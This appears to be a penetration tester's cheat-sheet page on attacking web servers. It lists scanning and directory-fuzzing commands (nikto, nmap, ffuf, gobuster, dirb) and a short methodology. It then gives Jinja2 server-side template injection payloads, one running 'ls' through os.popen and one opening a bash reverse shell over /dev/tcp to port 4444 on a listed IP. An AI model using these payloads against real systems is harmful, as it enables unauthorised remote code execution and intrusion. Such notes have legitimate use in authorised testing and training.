---
  title: "HTTP"
  weight: 3
  chapter: true
---
nikto -host

Port and service scanning
nmap -sV --script=http-enum 192.168.120.62

curl -v http://192.168.120.62:8000


FUZZING
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://147.102.33.187/FUZZ"
gobuster dir --url 10.129.227.155 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://10.10.11.100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30 -x php

dirb http://192.168.120.62:8000


HTTP Methodology

- identify http port
- identify services version
- identify stack (wordpress, joumla etc.)


Check if web app is vulnerable to Server-Side Template Injection
URL: 192.248.251.3:8000/{{7*’7'}}
SSTI Payload: {{config.__class__.__init__.__globals__[‘os’].popen(‘ls’).read()}}
SSTI Payload: {{config.__class__.__init__.__globals__[‘os’].popen(“bash -c ‘bash -i >& /dev/tcp/192.248.251.2/4444 0>&1’”).read()}}

xsser tool
